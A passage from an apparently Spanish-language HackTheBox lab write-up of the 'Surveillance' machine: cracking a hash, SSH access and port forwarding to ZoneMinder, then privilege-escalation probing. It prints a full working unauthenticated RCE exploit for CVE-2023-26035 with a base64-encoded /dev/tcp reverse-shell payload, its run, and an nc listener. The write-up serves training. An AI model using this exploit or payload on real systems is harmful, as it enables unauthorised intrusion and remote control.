</span></span></span></code></pre></div><p><code>39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec</code> se ve como un hash.</p><ul><li>Guardo este hash y lo paso a <code>Crackstation</code> (<a href=https://crackstation.net/ class=external-link target=_blank rel=noopener>https://crackstation.net/</a>) para intentar un <code>Brute Force Password Cracking</code> (crackear la contrase√±a por fuereza bruta):
<img alt=Surveillance_7.png src=/pentesting/images/Surveillance_7.png>
y encontramos una contrase√±a: <code>starcraft122490</code></li><li>Chequeo con <code>NetExec</code> (el sucesor de <code>CrackMapExec</code>) si tengo acceso al usuario <code>matthew</code> via <code>SSH</code> y la tenemos:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec ssh 10.10.11.245 -u &#39;matthew&#39; -p &#39;starcraft122490&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SSH         10.10.11.245    22     10.10.11.245     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4
</span></span></span><span class=line><span class=cl><span class=go>SSH         10.10.11.245    22     10.10.11.245     [+] matthew:starcraft122490  (non root) Linux - Shell access!
</span></span></span></code></pre></div><p>De manera que podemos acceder via <code>SSH</code> con las credenciales <code>matthew:starcraft122490</code> a la m√°quina v√≠ctima, donde podemos obtener la flag de usuario en el home de <code>matthew</code>.</p><h2 id=root>Root
<a class=heading-link href=#root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>Una vez dentro, si busco por puertos abiertos, puedo ver un par de puertos que no estaban previamente expuestos por el scan de <code>Nmap</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>matthew@surveillance:~$ ss -ntlp
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>State               Recv-Q              Send-Q                           Local Address:Port                            Peer Address:Port              Process
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   80                                   127.0.0.1:3306                                 0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   511                                  127.0.0.1:8080                                 0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   511                                    0.0.0.0:80                                   0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   4096                             127.0.0.53%lo:53                                   0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   128                                    0.0.0.0:22                                   0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   128                                       [::]:22                                      [::]:*
</span></span></span></code></pre></div><p>De manera que tenemos un servicio <code>MySQL</code> corriendo en el puerto <code>3306</code> (como es usual), y algo corriendo en el puerto <code>8080</code> (usualmente usado para servicios web).</p><ul><li>Para chequear si es un servicio que puede ser visitado a trav√©s de un browser de internet como <code>Firefox</code>, personalmente me gusta usar primero <code>cURL</code> y ver el output:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>matthew@surveillance:~$ curl -s http://127.0.0.1:8080
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;!DOCTYPE html&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;html lang=&#34;en&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;head&gt;
</span></span></span><span class=line><span class=cl><span class=go>  &lt;meta charset=&#34;utf-8&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=go>  &lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;IE=edge&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=go>  &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=go>  &lt;title&gt;ZM - Login&lt;/title&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>var failed = false;
</span></span></span><span class=line><span class=cl><span class=go>  &lt;/script&gt;
</span></span></span><span class=line><span class=cl><span class=go>  &lt;script src=&#34;skins/classic/views/js/login.js&#34;&gt;&lt;/script&gt;
</span></span></span><span class=line><span class=cl><span class=go>  &lt;script src=&#34;skins/classic/js/skin.js&#34;&gt;&lt;/script&gt;
</span></span></span><span class=line><span class=cl><span class=go>  &lt;script src=&#34;js/logger.js&#34;&gt;&lt;/script&gt;
</span></span></span><span class=line><span class=cl><span class=go>  &lt;script nonce=&#34;f3e94bd4e8a1388222a111d79663f97d&#34;&gt;$j(&#39;.chosen&#39;).chosen();&lt;/script&gt;
</span></span></span><span class=line><span class=cl><span class=go>  &lt;script nonce=&#34;f3e94bd4e8a1388222a111d79663f97d&#34;&gt;CsrfMagic.end();&lt;/script&gt;&lt;/body&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;/html&gt;
</span></span></span></code></pre></div><p>Si no hubiera output, o si <code>curl</code> hubiese lanzado un error, asumo que no es un sitio web o similar. Pero dado que s√≠ tenemos output, sospecho entonces que s√≠ es un sitio web.</p><ul><li>Pero este servicio no est√° disponible fuera de la m√°quina. S√≥lo internamente, y dado que tenemos credentiales por <code>SSH</code>, intentar√© un <code>Local Port Forwarding</code> para jugar con los puertos. Cierro la sesi√≥n de <code>SSH</code>, y me re conecto a la m√°quina via <code>SSH</code>, pero esta vez agregando al conectarnos la opci√≥n <code>-L 1234:127.0.0.1:8080</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sshpass -p &#39;starcraft122490&#39; ssh -o stricthostkeychecking=no -L 1234:127.0.0.1:8080 matthew@10.10.11.245
</span></span></span></code></pre></div><p>Con esto convierto mi puerto local <code>1234</code> en el puerto <code>8080</code> de la m√°quina v√≠ctima.</p><ul><li>De manera que ahora abro un browser de internet (en mi caso uso <code>Firefox</code>) y visito <code>http://127.0.0.1:1234</code>. Y puedo ver una p√°gina web:
<img alt=Surveillance_8.png src=/pentesting/images/Surveillance_8.png></li><li>Aparentemente, este sitio est√° corriendo <code>ZoneMinder</code></li></ul><blockquote><p><code>ZoneMinder</code> es un software gratuito, open-source, para monitoreo</p></blockquote><ul><li>Para chequear la version de √©ste podemos correr:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>matthew@surveillance:~$ dpkg -l | grep zoneminder
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>hi  zoneminder                            1.36.32+dfsg1-1                         amd64        video camera security and surveillance solution
</span></span></span></code></pre></div><p>de manera que la versi√≥n es <code>1.36.32</code>.</p><ul><li>Usando <code>SearchSploit</code> busco por exploits para <code>ZoneMinder</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ searchsploit zoneminder
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-------------------------------------------------------- ---------------------------------
</span></span></span><span class=line><span class=cl><span class=go> Exploit Title                                          |  Path
</span></span></span><span class=line><span class=cl><span class=go>-------------------------------------------------------- ---------------------------------
</span></span></span><span class=line><span class=cl><span class=go>ZoneMinder 1.24.3 - Remote File Inclusion               | php/webapps/17593.txt
</span></span></span><span class=line><span class=cl><span class=go>Zoneminder 1.29/1.30 - Cross-Site Scripting / SQL Injec | php/webapps/41239.txt
</span></span></span><span class=line><span class=cl><span class=go>ZoneMinder 1.32.3 - Cross-Site Scripting                | php/webapps/47060.txt
</span></span></span><span class=line><span class=cl><span class=go>Zoneminder &lt; v1.37.24 - Log Injection &amp; Stored XSS &amp; CS | php/webapps/51071.py
</span></span></span><span class=line><span class=cl><span class=go>ZoneMinder Snapshots &lt; 1.37.33 - Unauthenticated RCE    | php/webapps/51902.py
</span></span></span><span class=line><span class=cl><span class=go>ZoneMinder Video Server - packageControl Command Execut | unix/remote/24310.rb
</span></span></span><span class=line><span class=cl><span class=go>-------------------------------------------------------- ---------------------------------
</span></span></span><span class=line><span class=cl><span class=go>Shellcodes: No Results
</span></span></span></code></pre></div><p>El exploit <code>51902</code> se ve prometedor, dado que se ajusta a nuestra versi√≥n.</p><ul><li>El exploit en s√≠ es:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>bs4</span> <span class=kn>import</span> <span class=n>BeautifulSoup</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>argparse</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Exploit Title: Unauthenticated RCE in ZoneMinder Snapshots</span>
</span></span><span class=line><span class=cl><span class=c1># Date: 12 December 2023</span>
</span></span><span class=line><span class=cl><span class=c1># Discovered by : @Unblvr1</span>
</span></span><span class=line><span class=cl><span class=c1># Exploit Author: Ravindu Wickramasinghe (@rvizx9)</span>
</span></span><span class=line><span class=cl><span class=c1># Vendor Homepage: https://zoneminder.com/</span>
</span></span><span class=line><span class=cl><span class=c1># Software Link: https://github.com/ZoneMinder/zoneminder</span>
</span></span><span class=line><span class=cl><span class=c1># Version: prior to 1.36.33 and 1.37.33</span>
</span></span><span class=line><span class=cl><span class=c1># Tested on: Arch Linux, Kali Linux</span>
</span></span><span class=line><span class=cl><span class=c1># CVE : CVE-2023-26035</span>
</span></span><span class=line><span class=cl><span class=c1># Github Link : https://github.com/rvizx/CVE-2023-26035</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ZoneMinderExploit</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>target_uri</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>target_uri</span> <span class=o>=</span> <span class=n>target_uri</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>csrf_magic</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>fetch_csrf_token</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[&gt;] fetching csrt token&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>target_uri</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>csrf_magic</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>get_csrf_magic</span><span class=p>(</span><span class=n>response</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>response</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span> <span class=ow>and</span> <span class=n>re</span><span class=o>.</span><span class=k>match</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;^key:[a-f0-9]</span><span class=si>{40}</span><span class=s1>,\d+&#39;</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>csrf_magic</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[&gt;] recieved the token: </span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>csrf_magic</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] unable to fetch or parse token.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get_csrf_magic</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>response</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>BeautifulSoup</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>,</span> <span class=s1>&#39;html.parser&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s1>&#39;input&#39;</span><span class=p>,</span> <span class=p>{</span><span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;__csrf_magic&#39;</span><span class=p>})</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;value&#39;</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>execute_command</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>cmd</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[&gt;] sending payload..&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;view&#39;</span><span class=p>:</span> <span class=s1>&#39;snapshot&#39;</span><span class=p>,</span> <span class=s1>&#39;action&#39;</span><span class=p>:</span> <span class=s1>&#39;create&#39;</span><span class=p>,</span> <span class=s1>&#39;monitor_ids[0][Id]&#39;</span><span class=p>:</span> <span class=sa>f</span><span class=s1>&#39;;</span><span class=si>{</span><span class=n>cmd</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;__csrf_magic&#39;</span><span class=p>:</span> <span class=bp>self</span><span class=o>.</span><span class=n>csrf_magic</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>target_uri</span><span class=si>}</span><span class=s2>/index.php&#34;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[&gt;] payload sent&#34;</span> <span class=k>if</span> <span class=n>response</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span> <span class=k>else</span> <span class=s2>&#34;[!] failed to send payload&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>exploit</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>payload</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_csrf_token</span><span class=p>():</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[&gt;] executing...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>execute_command</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span> <span class=o>=</span> <span class=n>argparse</span><span class=o>.</span><span class=n>ArgumentParser</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;-t&#39;</span><span class=p>,</span> <span class=s1>&#39;--target-url&#39;</span><span class=p>,</span> <span class=n>required</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s1>&#39;target url endpoint&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;-ip&#39;</span><span class=p>,</span> <span class=s1>&#39;--local-ip&#39;</span><span class=p>,</span> <span class=n>required</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s1>&#39;local ip&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;-p&#39;</span><span class=p>,</span> <span class=s1>&#39;--port&#39;</span><span class=p>,</span> <span class=n>required</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s1>&#39;port&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>args</span> <span class=o>=</span> <span class=n>parser</span><span class=o>.</span><span class=n>parse_args</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># generating the payload</span>
</span></span><span class=line><span class=cl>    <span class=n>ps1</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;bash -i &gt;&amp; /dev/tcp/</span><span class=si>{</span><span class=n>args</span><span class=o>.</span><span class=n>local_ip</span><span class=si>}</span><span class=s2>/</span><span class=si>{</span><span class=n>args</span><span class=o>.</span><span class=n>port</span><span class=si>}</span><span class=s2> 0&gt;&amp;1&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>ps2</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>ps1</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;echo </span><span class=si>{</span><span class=n>ps2</span><span class=si>}</span><span class=s2> | base64 -d | /bin/bash&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>ZoneMinderExploit</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>target_url</span><span class=p>)</span><span class=o>.</span><span class=n>exploit</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><p>el cual manda una reverse shell a una IP y puerto dado.</p><ul><li>Mirando el c√≥digo del exploit tenemos que s√≠ o s√≠ correrlo en nuestra m√°quina de atacante. Esto porque el script pide la librer√≠a <code>BeautifulSoap</code>, la cual no viene por defecto instalada con <code>python3</code> (y no hay manera de instalarla en la m√°quina v√≠ctima sin ser <code>root</code>, ni menos sin conexi√≥n a internet como lo son las m√°quinas de HTB). En realidad esto no presenta ning√∫n problema gracias al <code>Local Port Forwarding</code> que hab√≠amos establecido previamente.</li><li>De manera que, en otra shell/terminal, empezamos otro listener con <code>nc</code> en el puerto <code>443</code> y corremos:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 zoneminder_snapshot_unauth_rce.py -t http://127.0.0.1:1234 -ip 10.10.16.6 -p 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[&gt;] fetching csrt token
</span></span></span><span class=line><span class=cl><span class=go>[&gt;] recieved the token: key:0bfb5b839801ff10b9a9a6d91775fcd0e69aeecc,1713488472
</span></span></span><span class=line><span class=cl><span class=go>[&gt;] executing...
</span></span></span><span class=line><span class=cl><span class=go>[&gt;] sending payload..
</span></span></span></code></pre></div><p>y en mi listener de <code>nc</code> obtengo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.245] 43902
</span></span></span><span class=line><span class=cl><span class=go>bash: cannot set terminal process group (1086): Inappropriate ioctl for device
</span></span></span><span class=line><span class=cl><span class=go>bash: no job control in this shell
</span></span></span><span class=line><span class=cl><span class=go>zoneminder@surveillance:/usr/share/zoneminder/www$ whoami
</span></span></span><span class=line><span class=cl><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>zoneminder
</span></span></span></code></pre></div><ul><li>Pero ahora como el usuario <code>zoneminder</code>. Una vez como este usuario, puedo ver que √©ste puede correr comandos con <code>sudo</code> sin proporcionar contrase√±a:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>zoneminder@surveillance:/usr/share/zoneminder/www$ sudo -l
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Matching Defaults entries for zoneminder on surveillance:
</span></span></span><span class=line><span class=cl><span class=go>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User zoneminder may run the following commands on surveillance:
</span></span></span><span class=line><span class=cl><span class=go>    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
</span></span></span></code></pre></div><ul><li>B√°sicamente, podemos correr cualquier script de <code>Perl</code> (que termine con <code>.pl</code>), que comience con <code>zm</code>, luego contenga letras y que se encuentre dentro del directorio <code>/usr/bin</code>. Como √©ste s√≥lo acepta letras luego de <code>/usr/bin/zm</code>, no podemos inyectar algo como <code>../</code> (de manera que tratar de correr <code>sudo /usr/bin/zm/../../../../../../../script_malicoso.pl</code> no funcionar√°). Viendo qu√© podemos correr tenemos:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>zoneminder@surveillance:/usr/share/zoneminder/www$ find /usr/bin -name &#34;zm*.pl&#34; -exec ls -la {} \; 2&gt;/dev/null
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-rwxr-xr-x 1 root root 5340 Nov 23  2022 /usr/bin/zmtrack.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 13994 Nov 23  2022 /usr/bin/zmpkg.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 6043 Nov 23  2022 /usr/bin/zmcontrol.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 5640 Nov 23  2022 /usr/bin/zmonvif-probe.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 8205 Nov 23  2022 /usr/bin/zmvideo.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 13111 Nov 23  2022 /usr/bin/zmtelemetry.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 2133 Nov 23  2022 /usr/bin/zmsystemctl.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 19386 Nov 23  2022 /usr/bin/zmonvif-trigger.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 7022 Nov 23  2022 /usr/bin/zmwatch.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 26232 Nov 23  2022 /usr/bin/zmdc.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 4815 Nov 23  2022 /usr/bin/zmstats.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 18482 Nov 23  2022 /usr/bin/zmtrigger.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 19655 Nov 23  2022 /usr/bin/zmx10.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 35206 Nov 23  2022 /usr/bin/zmfilter.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 12939 Nov 23  2022 /usr/bin/zmcamtool.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 43027 Nov 23  2022 /usr/bin/zmaudit.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 45421 Nov 23  2022 /usr/bin/zmupdate.pl
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root root 17492 Nov 23  2022 /usr/bin/zmrecover.pl
</span></span></span></code></pre></div><p>de manera que podemos correr cualquiera de estos archivos como el usuario <code>root</code>.</p><ul><li>Luego de jugar con algunos archivos, encuentro el archivo <code>/usr/bin/zmupdate.pl</code>. Si simplemente lo corremos tenemos que no pasa nada:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>zoneminder@surveillance:/tmp$ sudo /usr/bin/zmupdate.pl
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Database already at version 1.36.32, update skipped.
</span></span></span></code></pre></div><p>pero chequeando por opciones/argumentos que el script recibe tenemos que:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>zoneminder@surveillance:/tmp$ sudo /usr/bin/zmupdate.pl --help
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Unknown option: help
</span></span></span><span class=line><span class=cl><span class=go>Usage:
</span></span></span><span class=line><span class=cl><span class=go>    zmupdate.pl -c,--check | -f,--freshen | -v&lt;version&gt;,--version=&lt;version&gt;
</span></span></span><span class=line><span class=cl><span class=go>    [-u &lt;dbuser&gt; -p &lt;dbpass&gt;]
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Options:
</span></span></span><span class=line><span class=cl><span class=go>    -c, --check - Check for updated versions of ZoneMinder -f, --freshen -
</span></span></span><span class=line><span class=cl><span class=go>    Freshen the configuration in the database. Equivalent of old zmconfig.pl
</span></span></span><span class=line><span class=cl><span class=go>    -noi --migrate-events - Update database structures as per
</span></span></span><span class=line><span class=cl><span class=go>    USE_DEEP_STORAGE setting. -v &lt;version&gt;, --version=&lt;version&gt; - Force
</span></span></span><span class=line><span class=cl><span class=go>    upgrade to the current version from &lt;version&gt; -u &lt;dbuser&gt;,
</span></span></span><span class=line><span class=cl><span class=go>    --user=&lt;dbuser&gt; - Alternate DB user with privileges to alter DB -p
</span></span></span><span class=line><span class=cl><span class=go>    &lt;dbpass&gt;, --pass=&lt;dbpass&gt; - Password of alternate DB user with
</span></span></span><span class=line><span class=cl><span class=go>    privileges to alter DB -s, --super - Use system maintenance account on
</span></span></span><span class=line><span class=cl><span class=go>    debian based systems instead of unprivileged account -d &lt;dir&gt;,
</span></span></span><span class=line><span class=cl><span class=go>    --dir=&lt;dir&gt; - Directory containing update files if not in default build
</span></span></span><span class=line><span class=cl><span class=go>    location -interactive - interact with the user -nointeractive - do not
</span></span></span><span class=line><span class=cl><span class=go>    interact with the user
</span></span></span></code></pre></div><p>incluso si la opci√≥n <code>--help</code> no existe, s√≠ me ayud√≥. Hay una flag <code>-v</code> o <code>--version</code> la cual pregunta por una version. Si usamos <code>--version 1</code> el script corre, pero al final tira un error:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>zoneminder@surveillance:/tmp$ sudo /usr/bin/zmupdate.pl --version 1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Initiating database upgrade to version 1.36.32 from version 1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>WARNING - You have specified an upgrade from version 1 but the database version found is 1.36.32. Is this correct?
</span></span></span><span class=line><span class=cl><span class=go>Press enter to continue or ctrl-C to abort :
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Upgrading DB to 1.30.1 from 1.26.0
</span></span></span><span class=line><span class=cl><span class=go>ERROR 1136 (21S01) at line 8: Column count doesn&#39;t match value count at row 1
</span></span></span><span class=line><span class=cl><span class=go>Output:
